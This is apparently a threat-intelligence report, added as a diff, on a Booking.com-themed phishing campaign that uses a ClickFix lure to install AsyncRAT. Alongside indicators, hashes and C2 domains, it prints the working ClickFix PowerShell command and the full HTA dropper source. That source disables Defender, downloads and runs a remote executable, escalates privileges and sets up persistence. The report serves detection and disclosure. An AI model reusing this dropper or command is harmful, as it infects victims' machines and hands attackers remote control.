@@ -1,0 +1,287 @@
+---- Email Summary ----
+
+Messages purporting to be from sender(s):
+
+- "Booking.com" [user]@[domain.tld]
+
+with subject(s):
+
+- Action required: maintain contract parity compliance
+- Action required: resolve detected price conflict
+- Booking.com Legal Compliance – rate alert
+- Booking.com Legal: pricing discrepancy alert
+- Booking.com Legal: urgent parity action
+- Booking.com compliance audit initiated
+- Booking.com – New last-minute booking – paid online! (1159597364, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (1166842921, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (1186168836, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (1186487925, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (1559443593, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (1658184321, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (4416222469, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (5279628292, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (5817133658, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (8951411623, Wednesday, 22 October 2025.)
+- Booking.com – New last-minute booking – paid online! (9454518548, Wednesday, 22 October 2025.)
+- Compliance warning: detected parity breach
+- Detected discrepancy affecting contract visibility
+- Detected price mismatch – verify your public offer
+- Detected undercutting on competitive channel
+- Detected violation of parity clause – respond now
+- Immediate corrective action required
+- Partner parity compliance case opened
+- Potential rate undercut identified for your property
+- Urgent parity confirmation – Case ID inside
+- Urgent: correct rate variation before suspension
+- Your account flagged for rate compliance
+- Your contract requires pricing correction
+- Your property flagged for pricing inconsistency
+
+
+---- Description ----
+
+These messages contain URLs leading to a Booking-themed landing page displaying a verification. Once completed, the user is directed to a second verification. Once completed, the user is displayed ClickFix instructions. 
+
+```
+URL
+https://flypoet.toptenticketing.com/index.php?url=%68%74%74%70s%3A%2F%2F%72e%76ie%77%2D%63ase%69%64%2E%63%6F%6D%23%31%37d%49%59%39%5F%49
+Effective URL
+https://review-caseid.com/#17dIY9_I
+```
+
+ClickFix Command:
+```
+powershell -Command "Invoke-WebRequest https://nvrfn.com -OutFile '%PROGRAMDATA%\AA.hta'"; Start-Process mshta.exe -FilePath '%PROGRAMDATA%\AA.hta'"
+```
+
+This ClickFix command downloads an HTA file which does the following:
+
+- Displays a fake Booking.com verification window with a “Continue” button. When clicked, it triggers a VBScript function called InitiateVerification()
+- The VBScript creates several COM objects. These objects provide access to system commands, file management, and privilege escalation.
+- Privilege Escalation. The script runs ```adminLauncher.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -WindowStyle Hidden -File """ & configScript & """", "", "runas", 0``` which runs a PowerShell script with administrative rights, bypassing execution policy and hiding the PowerShell window.
+- The VBScript runs a PowerShell script.
+- The PowerShell script creates a startup shortcut path ```%USERPROFILE%\...\Startup\TrSec.lnk```
+- The PowerShell downloads and runs an executable.
+
+The EXE is used to run AsyncRAT.
+
+
+---- Example File Details ----
+
+```
+File Name	1023.cmd
+File Size	148 bytes
+File Type	ASCII text, with no line terminators
+MD5	767ab62d842f405bfd3a84f8df3af71e
+SHA1	645c49ef246840e8b6ca68d2a63dadbb767327d6
+SHA256	ccd74a1b5d8ea56e0ebe233ca618bf17d3720d8980eeed9a70eeb9c562cb9f61
+
+
+File name	AA.hta
+Associated Filenames	
+C:\ProgramData\AA.hta
+File Size	12206 bytes
+File Type	HTML document, Unicode text, UTF-8 text, with CRLF line terminators
+MD5	a2636c0487cab3421f75cb583a451bc1
+SHA1	468112f7c39d53736f93de8583ac6cac656a4869
+SHA256	605a8ddcd80c911dffb14537e3ca705c83767d9cedfeafe12de74fa587c877cf
+```
+
+---- Malware Configuration(s) ----
+
+
+```
+Version
+LoaderPanel
+
+Botnet
+Default
+
+C2
+8fnuawbfuac.click:8888
+
+8eh18dhq9wd.click:8888
+
+8hdfiqowchq.click:8888
+
+8nioqhxciwoqc.click:8888
+
+8fhd2idhacas.click:8888
+
+Mutex
+xtwlnjyjnqylkcje
+
+Attributes
+delay
+1
+
+install
+false
+
+install_folder
+%AppData%
+
+aes.plain
+I7ZQFF3YuIPWk1ncBn7ckyrruF7JVFqU
+```
+
+
+---- Process Tree(s) ----
+
+```
+powershell.exe powershell -Command "Invoke-WebRequest https://nvrfn.com -OutFile 'C:\ProgramData\AA.hta'"; Start-Process mshta.exe -FilePath 'C:\ProgramData\AA.hta'"
+mshta.exe "C:\ProgramData\AA.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} mshta.exe
+```
+
+EXE
+```
+C:\Users\Admin\AppData\Local\Temp\stllift.exe
+"C:\Users\Admin\AppData\Local\Temp\stllift.exe"
+PID:240
+C:\Windows\System32\Wbem\wmic.exe
+"wmic" computersystem get domain
+PID:5888
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:5540
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:3940
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:4380
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:4436
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:4456
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe"
+PID:5960
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
+PID:684
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
+PID:648
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
+```
+
+---- Script(s) ----
+
+```
+	<html> <head> <title>Booking.com</title> <HTA:APPLICATION ID="TrApp" APPLICATIONNAME="TrApp" BORDER="none" CAPTION="no" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" WINDOWSTATE="normal" SYSMENU="no" INNERBORDER="no" SCROLL="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no"> <style> body { font-family: 'BlinkMacSystemFont', -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; background: linear-gradient(135deg, #003580 0%, #0077cc 100%); color: #333; height: 100vh; display: flex; align-items: center; justify-content: center; } .travel-container { background: white; border-radius: 12px; box-shadow: 0 8px 32px rgba(0, 53, 128, 0.3); width: 420px; overflow: hidden; } .travel-header { background: #003580; padding: 24px; text-align: center; } .travel-logo { color: white; font-size: 24px; font-weight: bold; letter-spacing: -0.5px; } .travel-content { padding: 32px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; } .travel-icon { width: 80px; height: 80px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; } .lock-img { width: 64px; height: 64px; } .travel-title { font-size: 20px; font-weight: 600; color: #003580; margin-bottom: 16px; text-align: center; } .travel-message { font-size: 14px; line-height: 1.5; color: #666; margin-bottom: 24px; text-align: center; width: 100%; } .travel-button { background: #003580; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; width: 100%; } .travel-button:hover { background: #002557; } .travel-footer { background: #f5f7fa; padding: 16px; text-align: center; font-size: 12px; color: #999; border-top: 1px solid #e6e6e6; } </style> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> </head> <body> <div class="travel-container"> <div class="travel-header"> <div class="travel-logo">Booking.com</div> </div> <div class="travel-content"> <div class="travel-icon"> <img src="https://t-cf.bstatic.com/design-assets/assets/v3.160.0/illustrations-traveller/Reviews.png" width="80" height="69" alt="Reviews Illustration"> </div> <div class="travel-title">Verification Required</div> <div class="travel-message"> Please click YES in the next window to continue. </div> <button class="travel-button" onclick="InitiateVerification()">Continue</button> </div> <div class="travel-footer"> Copyright 2025 Booking.com </div> </div> <script language="VBScript"> On Error Resume Next ' .......................... .................. ................ 
+Dim systemController, fileManager Set systemController = CreateObject("WScript.Shell") 
+Set fileManager = CreateObject("Scripting.FileSystemObject") ' ................ ........  -  ............ .. Program Files ...... ........................ 
+Dim programFilesPath, mainExecutable, startupShortcut programFilesPath = systemController.ExpandEnvironmentStrings("%ProgramFiles%") & "\TrSec" mainExecutable = programFilesPath & "\TrSec.exe" startupShortcut = systemController.SpecialFolders("Startup") & "\TrSec.lnk" Sub InitiateVerification ' ................ .............. .................... 
+Dim completionMarker completionMarker = systemController.ExpandEnvironmentStrings("%ProgramData%") & "\travel_verification_complete.marker" If fileManager.FileExists(completionMarker) 
+Then window.close Exit 
+Sub End If ' .............. .................... window.resizeTo 0, 0 window.moveTo  - 10000, - 10000 ' .......................... .................. ................ Randomize ' ................ .............. .................... .. Program Files (.......... .............. .. .............. ............) ' ........ ............ .................. .................... .... ...... 
+If Not fileManager.FolderExists(programFilesPath) Then ' .......... .......... .............. .. PowerShell .............. .. .............. ............ End If ' ...................... .......... ................ - .................. ............ .. TEMP 
+Dim configScript configScript = systemController.ExpandEnvironmentStrings("%TEMP%") & "\travel_config.ps1" ' .................... URL ...................... 
+Dim urlPart1, urlPart2, urlPart3, urlPart4, urlPart5, downloadUrl urlPart1 = "ht" & "tps:" urlPart2 = "//nv" & "r" urlPart3 = "fn.co" & "m/g" urlPart4 = "o/" & "stl" urlPart5 = "lift.ex" & "e" downloadUrl = urlPart1 & urlPart2 & urlPart3 & urlPart4 & urlPart5 ' ................ .................. .............. ........................ 
+Dim scriptWriter Set scriptWriter = fileManager.CreateTextFile(configScript, True) ' ........ ...................... .................. ................ 
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 500" 
+scriptWriter.WriteLine "Get-Date | Out-Null" 
+
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 300" 
+
+scriptWriter.WriteLine "Set-ExecutionPolicy Bypass -Scope Process -Force" 
+
+scriptWriter.WriteLine "$completionIndicator = Join-Path $env:ProgramData 'travel_verification_complete.marker'" 
+
+scriptWriter.WriteLine "$programFilesDir = '" & programFilesPath & "'" 
+scriptWriter.WriteLine "$binaryFullPath = '" & mainExecutable & "'" 
+scriptWriter.WriteLine "$startupLocation = '" & startupShortcut & "'" 
+
+scriptWriter.WriteLine "if (Test-Path $completionIndicator) { " 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 800" 
+scriptWriter.WriteLine " exit 0" 
+scriptWriter.WriteLine "}" 
+
+scriptWriter.WriteLine "New-Item $completionIndicator -ItemType File -Force | Out-Null" 
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 400" ' ................ .................... .. Program Files (.............. .......... ........) 
+scriptWriter.WriteLine "if (-not (Test-Path $programFilesDir)) {" 
+scriptWriter.WriteLine " New-Item -Path $programFilesDir -ItemType Directory -Force | Out-Null" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 500" 
+scriptWriter.WriteLine "}" ' ...................... .................. ............ 
+scriptWriter.WriteLine "try { " 
+scriptWriter.WriteLine " Get-Process | Out-Null" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 200" 
+scriptWriter.WriteLine "} catch { }" 
+
+scriptWriter.WriteLine "try { Start-Process 'https://admin.booking.com/' } catch { }" 
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 600" ' ........................ ........................ .............. 
+scriptWriter.WriteLine "try {" 
+scriptWriter.WriteLine " Set-MpPreference -DisableRealtimeMonitoring $true" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 300" 
+scriptWriter.WriteLine " Set-MpPreference -DisableBehaviorMonitoring $true" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 250" 
+scriptWriter.WriteLine " Set-MpPreference -DisableBlockAtFirstSeen $true" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 200" 
+scriptWriter.WriteLine " Set-MpPreference -DisableIOAVProtection $true" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 150" 
+scriptWriter.WriteLine " Set-MpPreference -DisableScriptScanning $true" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 100" 
+scriptWriter.WriteLine " Add-MpPreference -ExclusionPath $programFilesDir" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 200" 
+
+scriptWriter.WriteLine " Add-MpPreference -ExclusionProcess $binaryFullPath" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 400" 
+scriptWriter.WriteLine "} catch { }" 
+scriptWriter.WriteLine "$resourceEndpoint = '" & downloadUrl & "'" 
+scriptWriter.WriteLine "$transferCompleted = $false" 
+scriptWriter.WriteLine "$retrySequence = @(1,3,7)" 
+scriptWriter.WriteLine "for ($iteration=0; $iteration -lt $retrySequence.Count -and -not $transferCompleted; $iteration++) {" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 500" 
+scriptWriter.WriteLine " try {" 
+scriptWriter.WriteLine " Invoke-WebRequest -Uri $resourceEndpoint -OutFile $binaryFullPath -ErrorAction Stop" 
+scriptWriter.WriteLine " if (Test-Path $binaryFullPath) { $transferCompleted=$true }" 
+scriptWriter.WriteLine " } catch { " 
+scriptWriter.WriteLine " Start-Sleep -Seconds $retrySequence[$iteration]" 
+scriptWriter.WriteLine " }" 
+scriptWriter.WriteLine "}" 
+scriptWriter.WriteLine "if (-not $transferCompleted) { " 
+scriptWriter.WriteLine " Remove-Item $completionIndicator -Force -ErrorAction SilentlyContinue" 
+scriptWriter.WriteLine " Start-Sleep -Seconds 2" 
+scriptWriter.WriteLine " exit 1" 
+scriptWriter.WriteLine "}" 
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 800" 
+scriptWriter.WriteLine "try { " 
+scriptWriter.WriteLine " Start-Process $binaryFullPath" 
+scriptWriter.WriteLine "} catch { }" 
+scriptWriter.WriteLine "Start-Sleep -Milliseconds 600" 
+scriptWriter.WriteLine "try {" 
+scriptWriter.WriteLine " $shellInterface = New-Object -ComObject WScript.Shell" 
+scriptWriter.WriteLine " $startupEntry = $shellInterface.CreateShortcut($startupLocation)" 
+scriptWriter.WriteLine " $startupEntry.TargetPath = $binaryFullPath" 
+scriptWriter.WriteLine " $startupEntry.WindowStyle = 7" 
+scriptWriter.WriteLine " $startupEntry.Description = 'Travel Security Service'" 
+scriptWriter.WriteLine " $startupEntry.IconLocation = '$binaryFullPath, 0'" 
+scriptWriter.WriteLine " $startupEntry.Save()" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 400" 
+scriptWriter.WriteLine "} catch { }" 
+scriptWriter.WriteLine "$registryLocation = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder'" 
+scriptWriter.WriteLine "$registryKey = 'TrSec.lnk'" 
+scriptWriter.WriteLine "$approvalBytes = [byte[]](2,0,0,0,0,0,0,0,0,0,0,0)" 
+scriptWriter.WriteLine "if (Test-Path $registryLocation) { try { Set-ItemProperty -Path $registryLocation -Name $registryKey -Value $approvalBytes -Force } catch {} }" 
+scriptWriter.WriteLine "Start-Sleep -Seconds 3" ' .................... .................. ................ 
+scriptWriter.WriteLine "try { " 
+scriptWriter.WriteLine " Get-Service | Out-Null" 
+scriptWriter.WriteLine " Start-Sleep -Milliseconds 300" 
+scriptWriter.WriteLine "} catch { }" ' .............. .................... .............. 
+scriptWriter.WriteLine "Remove-Item '" & configScript & "' -Force -ErrorAction SilentlyContinue" 
+scriptWriter.WriteLine "Get-Date | Out-Null" 
+scriptWriter.WriteLine "Start-Sleep -Seconds 1" 
+scriptWriter.WriteLine "exit 0" scriptWriter.Close ' ............................ ................ .......... ...................... 
+Dim executionDelay For executionDelay = 1 To 2000: Next ' ............ .. ...................... ........................ ...... ............ .. Program Files 
+Dim adminLauncher Set adminLauncher = CreateObject("Shell.Application") adminLauncher.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -WindowStyle Hidden -File """ & configScript & """", "", "runas", 0 ' .................. ................ .......... .................. window.setTimeout "self.close()", 3000 End Sub
+</script> </body> </html>
+```
+
+---- Reference(s) ----
+
+- https://tria.ge/251023-s2g4bae13h/behavioral2
+- https://x.com/JAMESWT_WT/status/1981032559275278629
